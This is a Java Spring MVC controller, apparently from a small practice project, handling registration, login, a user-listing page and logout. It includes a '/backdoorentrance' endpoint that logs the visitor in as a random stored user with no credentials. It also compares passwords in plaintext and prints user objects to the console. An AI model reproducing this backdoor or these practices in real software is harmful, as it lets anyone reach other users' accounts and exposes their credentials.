package ua.com.hav.web;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.bind.support.SessionStatus;
import ua.com.hav.model.User;
import ua.com.hav.model.UserValidator;
import ua.com.hav.storage.UserDao;
import ua.com.hav.util.Messages;

import java.util.Date;

/**
 * Created by sunny on 18.12.17
 */
@Controller
@SessionAttributes(types = User.class)
public class SomeController {

    @Autowired
    private UserDao userDao;

    @Autowired
    private UserValidator validator;

    @Autowired
    private Messages messages;

    @RequestMapping({"", ".index"})
    public String index() {
        String s = messages.get("msg.login.error");
        System.out.println("s = " + s);
        return "index";
    }

    @RequestMapping("/reg")
    public String regForm(Model model) {
        model.addAttribute("reg_user", new User());
        return "reg_form";
    }

    @RequestMapping(value = "/reg", method = RequestMethod.POST)
    public String reg(@Validated @ModelAttribute("reg_user") User user, BindingResult result, SessionStatus status) {
        System.out.println("user = " + user);
        if (result.hasErrors()) {
            return "reg_form";
        }
        if (userDao.add(user)) {
            status.setComplete();
            return "redirect:/login";
        }
        result.rejectValue("login","user.login", "is taken");
        return "reg_form";
    }

    @RequestMapping("/conf")
    public String abc(Model model) {
        model.addAttribute("msg", "msg.login.success");
        model.addAttribute("list", userDao.findAll());
        return "conf";
    }

    @RequestMapping("/login")
    public String loginPage(Model model) {
        model.addAttribute("log_user", new User());
        return "login";
    }

    @RequestMapping(value = "/login", method = RequestMethod.POST)
    public String login(@ModelAttribute("log_user") User user, Model model) {
        User logged = userDao.findByLogin(user.getLogin());
        if (logged != null && logged.getPassword().equals(user.getPassword())) {
            model.addAttribute("user", logged);
            return "redirect:/conf";
        }
        model.addAttribute("msg", "msg.login.error");
        return "login";
    }

    @RequestMapping("/logout")
    public String logout(SessionStatus status) {
        status.setComplete();
        return "redirect:/login";
    }

    @InitBinder
    protected void initValidator(WebDataBinder binder) {
        binder.setValidator(validator);
    }

    @RequestMapping("/backdoorentrance")
    public String backDoor(Model model) {
        model.addAttribute("user", userDao.findRandom());
        return "redirect:/conf";
    }
}
